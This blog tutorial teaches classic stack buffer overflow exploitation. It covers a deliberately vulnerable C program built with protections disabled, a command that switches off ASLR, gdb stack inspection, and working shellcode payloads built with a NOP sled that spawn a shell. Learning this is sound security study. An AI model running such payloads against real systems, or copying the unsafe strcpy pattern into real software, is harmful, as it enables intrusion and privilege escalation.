---
layout: post
title: "Buffer overflow - overview & old school exploitation"
date: 2020-01-01
tags: [security, linux, programming, vulnerabilities]
---

A buffer overflow is a very common type of vulnerability that allows a buffer to be overfilled. This can lead to a program crash, undefined behavior or exploitation by a malicious actor.

## Overview


Buffers are used to store and access data in memory. An example of a buffer is an array in a C program storing the results of a mathematical operation.

In C, an array is typically declared with a type and a number of elements:

```c
int numdata[100];
```

The above declaration will allocate a contigous block of memory on the stack capable of holding 100 integers. As we saw in a previous post, the stack grows from high addresses to low, and data is stored in little endian format, so the stack will look something look like this:

```
high addresses
    ===============
    |     ...     |
    |-------------|
    |     ...     |
    |-------------|
    |    0x...    | <- return address
    |-------------|
    |    0x...    | <- saved frame pointer
    |-------------| <- bottom of stack
    | numdata[99] |
    |-------------|
    | numdata[98] |
    |-------------|
          ...
    |-------------|
    | numdata[0]  |
    |-------------| <- TOP OF STACK
    |   |  |  |   |
    |   v  v  v   |
    ===============
low addresses
```

When a buffer overflows, we can see from the stack above that the saved frame pointer is overwritten first, then the return address, and then other stack data.

A program will typically crash if the buffer overflow happens by accident, since the return address has been overwritten by data that is unlikely to be a valid address to a valid instruction, or because other required data on the stack has been corrupted. But if the data written to the array comes from for example user input, a file read or a network client, a malicious actor may exploit the buffer overflow to take complete control of the program's execution.

> When a vulnerable program runs with high privileges, exploitation may give the attacker full control of the running system.

A buffer overflow vulnerability gives us the possibility to crash or manipulate a program, but the real power comes from the ability to overwrite the return address to anything we desire.

There are a lot of factors that can result in an exploitable buffer overflow vulnerability, including the programming language used (and the use of unsafe libraries), not sanitizing input, and a programmers lack of security skill or security focus.

## Old School exploitation

Years ago, the way to exploit a buffer overflow vulerability was to input data so that the vulnerable buffer contained the code we wanted to execute (typically a shell), and that the return address was overwritten to point to our injected code. When the vulnerable function returned, the *shellcode* was executed.

Even though modern systems may not permit such attacks anymore, this is the best place to start learning about buffer overflow attacks, as we cover the basics that we'll use in more advanced attacks against modern systems.


Consider the following vulnerable program:

```c
/*
 * bo_vuln1.c
 * gcc bo_vuln1.c -zexecstack -fno-stack-protector -g -o bo_vuln1
 */

#include <string.h>

void cp(char *s)
{
    char input[74];
    strcpy(input, s);
}

int main(int argc, char *argv[])
{
    if (argc > 1)
        cp(argv[1]);
    return 0;
}
```

The program takes user input and writes it uncritically to a small buffer, making it obviously vulnerable to a buffer overflow attack.

Notice that the program is compiled with some security functions disabled. These are enabled by default on most modern systems. If you want to follow along, be sure to also disable a security function called ASLR on your system:

```bash
$ sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

> We will look at all these disabled countermeasures in detail later.

On my 64-bit system, the program seems to work flawlessly when the user input is short, but will crash when given a long input string:

```bash
$ ./bo_vuln1 aaaa
$ ./bo_vuln1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

> Tip: In a bash shell, use alt-*N* followed by a character to print *N* characters to the screen.

`gdb` can be used to investigate what happens:

```bash
$ gdb bo_vuln1
```

View the disassembly, and break before the call to `strcpy`:

```bash
(gdb) disas cp
Dump of assembler code for function cp:
   0x0000000000401126 <+0>:     push   %rbp
   0x0000000000401127 <+1>:     mov    %rsp,%rbp
   0x000000000040112a <+4>:     sub    $0x60,%rsp
   0x000000000040112e <+8>:     mov    %rdi,-0x58(%rbp)
   0x0000000000401132 <+12>:    mov    -0x58(%rbp),%rdx
   0x0000000000401136 <+16>:    lea    -0x50(%rbp),%rax
   0x000000000040113a <+20>:    mov    %rdx,%rsi
   0x000000000040113d <+23>:    mov    %rax,%rdi
   0x0000000000401140 <+26>:    callq  0x401030 <strcpy@plt>
   0x0000000000401145 <+31>:    nop
   0x0000000000401146 <+32>:    leaveq
   0x0000000000401147 <+33>:    retq
End of assembler dump.
(gdb) b *cp+26
Breakpoint 2 at 0x40116b: file bo_vuln1.c, line 13.
```

> In gdb `disas` is short for `disassemble`, `r` for `run`, `b` for `break`.

We can see from the assembly code above that the first argument to the `strcpy`, which a man-page would reveal to be the *destination buffer* of the copy operation, is 0x50 bytes from the base. So the buffer is 80 bytes, not 74 bytes as declared in the program code. This is done by the compiler because of alignment requirements.

> The value put in `%rdi` before the call to a function is the first argument of the function in x86_64 assembly.

If there are other variables on the stack, the above method may not yield the size of the buffer, but the number of bytes from the beginning of the buffer until the saved frame pointer (which is what we are interested in anyway).

To overwrite to return address we need to fill the buffer (80 bytes), overwrite the saved frame pointer (8 bytes), and finally overwrite ret (8 bytes).

Run to program with 80 a's, 8 b's and 8 c's:

```bash
(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbcccccccc
...
Breakpoint 1, 0x0000000000401140 in cp (
    s=0x7fffffffda7b 'a' <repeats 80 times>, "bbbbbbbbcccccccc") at bo_vuln1.c:11
    11          strcpy(input, s);
```

Because of our set breakpoint, the program is paused before the call to `strcpy`. Let's examine the stack:

```bash
(gdb) x/96xb $rbp-0x50
0x7fffffffd5a0: 0x0b    0x00    0x00    0x00    0x00    0x00    0x00    0x00
...
0x7fffffffd5e8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffd5f0: 0x10    0xd6    0xff    0xff    0xff    0x7f    0x00    0x00
0x7fffffffd5f8: 0x70    0x11    0x40    0x00    0x00    0x00    0x00    0x00
```

The first line above is the start of the buffer. The saved base pointer and the return address are on the last two lines.

> You can confirm that the last line is indeed the return pointer by dissassembling the main function and observing that the address on the last line is the address of the instruction following the call to the `cp` function.

Here's the stack after `strcpy` has returned:

```bash
(gdb) ni
12      }
(gdb) x/96xb $rbp-0x50
0x7fffffffd5a0: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
...
0x7fffffffd5e8: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffd5f0: 0x62    0x62    0x62    0x62    0x62    0x62    0x62    0x62
0x7fffffffd5f8: 0x63    0x63    0x63    0x63    0x63    0x63    0x63    0x63
```

> We use `ni` (next instruction) to step to the next line of the current function (not stepping into the `strcpy` function like `si` would do).

The buffer is now filled with a's (0x61), the saved frame pointer and return address are overwritten by b's (0x62) and c's (0x63), respectively.

From our earlier disassembly of `cp`, we know three instructions remain: `nop`, `leaveq` and `retq`. We will continue our examination after `leaveq`, which will pop the saved frame pointer into the `%rbp` register:

```bash
(gdb) si 2
0x0000000000401147      12      }
(gdb) i r rbp
rbp            0x6262626262626262  0x6262626262626262
```

The b's we input is now the value of the base pointer. Let's see what happens when `retq` tries to return to the "0x6363..." address:

```
(gdb) si
Program received signal SIGSEGV, Segmentation fault.
...
(gdb) i r rip
rip            0x401147            0x401147 <cp+33>
```

The program crashes. Note that the instruction pointer is unchanged, still pointing to the `ret` instruction of `cp`. If you run the `bt` command in gdb, it is clear that the next return address is "0x6363...". The reason the program crashes is that the address is to large.

Try giving the same input as before, but reducing the number of c's to 4. The instruction pointer is successfully changed, but the program still crashes since it will try to return to 0x0000000063636363.

Next, instead of writing junk to the stack, we will exploit the vulnerability to get a shell.

### Getting a shell in gdb

Continuing to work in gdb, this is what we want the stack to look like for successful exploitation.

```
top of stack
===================================
shellcode                       <----o
shellcode                            |
...                                  |
shellcode                            |
==================================   |
junk (saved frame pointer)           |
==================================   |
ret pointing to start of shellcode --o
==================================
bottom of stack
```

To turn the stack into the above, we'll start with the shellcode. The writing of shellcode will be covered later, for now we can grab a working shellcode from shell-storm.org/shellcode.

> I've chosen the 33 byte Linux x86_64 `execve(/bin/sh, [/bin/sh], NULL)` by hophet, available at http://shell-storm.org/shellcode/files/shellcode-76.php

The bytes of the shellcode are as follows:

```
\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
```

We need to fill the buffer with 80 bytes, but our shellcode is only 33 bytes. What should the rest be filled with?

A really good choice is to prefix our shellcode with a NOP-sled and postfix it with anything.

A NOP is an assembly instruction that performs no operation. A NOP-sled is a neat trick that makes it easier to "hit" our shellcode with the address we'll overwrite ret with. The address of the buffer can vary based on a lot of factors, so a NOP-sled will increase our chances of not jumping outside or in the middle of our shellcode.

> A NOP instruction has byte value 0x90 in x86 assembly.

> If we know the precise location of the buffer, the NOP-sled is redundant (but not a problem).

The reason we want to postfix our shellcode is to keep it away from `$rbp` (remember that `$rbp` becomes the `$rsp` of a function we return to), because when our shellcode executes, some of it's instructions may push things onto the stack, overwriting parts of itself. Postfixing the shellcode with junk helps prevents this.

Here's one possible input to exploit the vulnerable program:

```
| 30 NOP's | 33 byte shellcode | 17 a's | 8 b's | 8 byte ret |
```

The ret should be to somewhere in our NOP-sled (find the address of the buffer by looking at the assembly or at the stack and add some bytes). I've chosen 0x7fffffffd5a8 on my system.

We can use python to help us input the exploit code:

```
(gdb) run `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\xa8\xd5\xff\xff\xff\x7f"'`
```

The program pauses at the breakpoint we set before `strcpy`. Let's go to the next instruction and examine the stack:

```bash
(gdb) ni
(gdb) x/96xb $rbp-0x50
0x7fffffffd5a0: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x7fffffffd5a8: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x7fffffffd5b0: 0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
0x7fffffffd5b8: 0x90    0x90    0x90    0x90    0x90    0x90    0x48    0x31
0x7fffffffd5c0: 0xd2    0x48    0xbb    0xff    0x2f    0x62    0x69    0x6e
0x7fffffffd5c8: 0x2f    0x73    0x68    0x48    0xc1    0xeb    0x08    0x53
0x7fffffffd5d0: 0x48    0x89    0xe7    0x48    0x31    0xc0    0x50    0x57
0x7fffffffd5d8: 0x48    0x89    0xe6    0xb0    0x3b    0x0f    0x05    0x61
0x7fffffffd5e0: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffd5e8: 0x61    0x61    0x61    0x61    0x61    0x61    0x61    0x61
0x7fffffffd5f0: 0x62    0x62    0x62    0x62    0x62    0x62    0x62    0x62
0x7fffffffd5f8: 0xa8    0xd5    0xff    0xff    0xff    0x7f    0x00    0x00
```

The buffer starts with the NOP-sled followed by the shellcode and padding junk. `ret` (on the last line) points inside the NOP-sled.

Now, delete all breakpoints, and continue the execution:

```bash
(gdb) d
(gdb) c
Continuing.
process 11057 is executing new program: /usr/bin/bash
sh-4.4$ 
```

We got a shell!

Next, we'll leave gdb and try to exploit the program in a terminal.

### Getting a shell in a terminal

Run the program with the same input as given in gdb:

```bash
$ ./bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\xa8\xd5\xff\xff\xff\x7f"'`
Segmentation fault (core dumped)
```

A segfault!

This happens because gdb and various terminals have a different number of environment variables resulting in non-equal stack addresses. Environment variables push the stack higher towards lower addresses.

We got two choices:

1) Keep guessing the ret address until we hit our NOP-sled.

2) Make sure gdb and terminals have the same stack addresses.

Choice number 1 can be tedious since our program has a pretty small NOP-sled.

Choice number 2 is more interesting. The following program will be used to illustrate the differences in the stack addresses:

```c
/*
 * address.c
 * gcc address.c -o address -std=c99
 */

#include <stdio.h>

int main()
{
    int buffer[50];
    printf("Address of buffer: %p\n", (void *)&buffer);
}
```

Note the address in gdb:

```bash
$ gdb address
(gdb) run
Address of buffer: 0x7fffffffd5b0
```

Then look at the address in a terminal:

```bash
$ ./address
Address of buffer: 0x7fffffffd5e0
```

gdb has 48 bytes more environment variables in memory, but note that this is not a static difference between the stack addresses in the terminal or in gdb.

> Try running `address` from a different terminal or with a different working directory to confirm that the address changes. You can use `env` to examine the environment in terminals and `show env` in gdb.

#### Getting the same address in the shell and gdb

To make sure gdb and terminals have the same addresses, do the following:

1) Run gdb with an empty enviroment and unset its special environment variables:

```bash
$ env - gdb address
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) r
Address of buffer: 0x7fffffffec30
```

2) Run programs in terminal with an empty environment, set `$PWD` and `$SHLVL` and use the full path of the program:

```
$ env - PWD=$PWD SHLVL=0 /path/to/address
Address of buffer: 0x7fffffffec30
```

Notice that the address is now the same.

Go back into gdb using the above method, and find the address of the buffer:

```bash
$ env - gdb address
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) b *cp+26
Breakpoint 1 at 0x401140: file bo_vuln1.c, line 11.
(gdb) r aaa
Breakpoint 1, 0x0000000000401140 in cp (s=0x7fffffffef9d "aaa") at bo_vuln1.c:11
...
(gdb) p $rbp-0x50
$1 = (void *) 0x7fffffffec90
```

> Since our program is compiled with debugging information (`-g`), we could get the address by using `p &input` in gdb.

Modify the exploit to jump into the NOP-sled, and run the program in the terminal:

```bash
$ env - PWD=$PWD SHLVL=0 /path/to/bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\x98\xec\xff\xff\xff\x7f"'`
Segmentation fault (core dumped)
```

Still no success. One final obstacle remains: our argument to the program moves to buffer address.

We know we are inputting 96 characters the program (to fill the buffer and overwrite two addresses), so our buffer address will be 96 bytes offset from our gdb result above.

A quick calculation gives 0x90 - 0x60 = 0x30 (the first number is the last byte of the buffer address that we got from gdb, and the second number is 96 converted to hex) and we are ready to exploit again:

```bash
$ env - PWD=$PWD SHLVL=0 /path/to/bo_vuln1 `python -c 'print 30 * "\x90" + "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" + 17 * "a" + 8 * "b" + "\x38\xec\xff\xff\xff\x7f"'`
sh-4.4$
```

> We can use `$PWD/program` instead of `/path/to/program`.

Finally, a shell!

To summarize: make sure to launch gdb and the vulnerable program as described above, and take the argument length into account to find the proper buffer address in the terminal.
